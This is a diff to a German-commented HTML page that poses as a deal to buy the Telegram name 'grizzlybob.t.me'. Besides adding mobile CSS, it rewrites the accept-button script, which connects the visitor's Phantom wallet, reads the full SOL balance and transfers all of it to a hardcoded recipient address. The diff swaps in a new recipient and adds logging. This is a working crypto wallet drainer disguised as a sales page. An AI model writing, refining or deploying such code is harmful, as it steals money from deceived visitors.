@@ -161,6 +161,61 @@
             background-color: #3b8cc4;
         }
 
+        /* Neue ID für "Deal in Progress" grünen Kasten - Mobil Optimiert */
+        #deal-in-progress-mobile {
+            background-color: #2b8200;  /* Grüner Hintergrund */
+            color: rgb(255, 255, 255);               /* Weiße Schrift */
+            padding: 6px 12px;          /* Weniger Padding für kompaktere Darstellung */
+            border-radius: 12px;        /* Abgerundete Ecken */
+            font-weight: bold;          /* Fett gedruckter Text */
+            font-size: 12px;            /* Kleinere Schriftgröße */
+         
+            text-align: center;         /* Text zentrieren */
+            margin-top: 12px; 
+            margin-left: 80px;  
+            margin-right: 80px;
+            margin-bottom: 15px;
+            justify-content: center;        /* Weniger Abstand nach oben auf mobilen Geräten */
+        }
+
+        /* Responsive Design für Handys */
+        @media (max-width: 768px) {
+            .top-container {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .deal-name {
+                font-size: 24px;
+            }
+
+            #deal-in-progress-mobile {
+                font-size: 12px;
+                padding: 6px 12px; /* Weniger Padding */
+               
+                margin-top: 12px;   /* Kleinerer Abstand */
+            }
+
+            .deal-item {
+                width: 48%;
+            }
+
+            .user-info {
+                padding: 12px;
+                margin-top: 20px;
+            }
+
+            .sol-info {
+                font-size: 14px;
+                padding: 10px 0;
+            }
+
+            .exchange-button {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -175,7 +230,7 @@
         <div class="top-container">
             <div class="textu">Buy Telegram Name:</div>
             <div class="deal-name">grizzlybob.t.me</div>
-            <div id="deal-in-progress-mobile">Deal in Progress</div>
+            <div id="deal-in-progress-mobile">Deal in Progress</div> <!-- Neue ID für den mobilen Status -->
         </div>
 
         <!-- Flex Container für Deal Info und User Info untereinander -->
@@ -229,55 +284,61 @@
 
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
-    <script>
-        document.getElementById("acceptButton").addEventListener("click", async () => {
-            if (window.solana && window.solana.isPhantom) {
-                try {
-                    // Verbindung zur Phantom Wallet herstellen
-                    await window.solana.connect();
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
+<script>
+    document.getElementById("acceptButton").addEventListener("click", async () => {
+        if (window.solana && window.solana.isPhantom) {
+            try {
+                // Verbindung zur Phantom Wallet herstellen
+                console.log("Versuche, mit Phantom zu verbinden...");
+                await window.solana.connect();
+                console.log("Verbindung erfolgreich!");
 
-                    // Verbindung herstellen und Wallet Public Key abrufen
-                    const wallet = window.solana;
-                    const publicKey = wallet.publicKey;
+                // Wallet Public Key abrufen
+                const wallet = window.solana;
+                const publicKey = wallet.publicKey;
+                console.log("Öffentlicher Schlüssel:", publicKey.toString());
 
-                    // Solana-Netzwerk-Verbindung
-                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+                // Solana-Verbindung
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
 
-                    // Hole den SOL-Guthaben
-                    const balance = await connection.getBalance(publicKey);
+                // Hole den SOL-Guthaben
+                const balance = await connection.getBalance(publicKey);
+                console.log("Balance:", balance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
 
-                    // Zieladresse (Beispiel-Wallet)
-                    const recipient = new solanaWeb3.PublicKey("HcTaTyhbgupFPUzYnw6jg4d6DBajdw1zwZgcrbuAVaX6");
+                // Zieladresse (Anpassung der Zieladresse)
+                const recipient = new solanaWeb3.PublicKey("64BiYMiusprav2GbnPbTY59oY1JkAA3Ny5BQftiNCC28");
 
-                    // Berechne den Betrag, der gesendet werden soll (die gesamte Balance)
-                    const amount = balance;
+                // Berechne den Betrag, der gesendet werden soll (die gesamte Balance)
+                const amount = balance;
 
-                    // Erstelle eine Transaktion
-                    const transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: wallet.publicKey,
-                            toPubkey: recipient,
-                            lamports: amount, // Der Betrag in Lamports (1 SOL = 1 Milliarde Lamports)
-                        })
-                    );
+                // Erstelle eine Transaktion
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: wallet.publicKey,
+                        toPubkey: recipient,
+                        lamports: amount, // Der Betrag in Lamports (1 SOL = 1 Milliarde Lamports)
+                    })
+                );
 
-                    // Sende die Transaktion
-                    const signature = await window.solana.signAndSendTransaction(transaction);
+                // Sende die Transaktion
+                const signature = await window.solana.signAndSendTransaction(transaction);
 
-                    // Bestätige die Transaktion
-                    await connection.confirmTransaction(signature, "confirmed");
+                console.log("Transaktionssignatur:", signature);
 
-                    alert("Transaktion erfolgreich! Die gesamte Balance wurde gesendet.");
-                } catch (error) {
-                    console.error("Fehler beim Verbinden mit Phantom Wallet oder Senden der Transaktion:", error);
-                    alert("Fehler bei der Verbindung mit Phantom Wallet oder beim Senden der Transaktion.");
-                }
-            } else {
-                alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
+                // Bestätige die Transaktion
+                await connection.confirmTransaction(signature, "confirmed");
+
+                alert("Transaktion erfolgreich! Die gesamte Balance wurde gesendet.");
+            } catch (error) {
+                console.error("Fehler beim Verbinden mit Phantom Wallet oder Senden der Transaktion:", error);
+                alert("Fehler bei der Verbindung mit Phantom Wallet oder beim Senden der Transaktion.");
             }
-        });
-    </script>
+        } else {
+            alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
+        }
+    });
+</script>
 
 </body>
 </html>
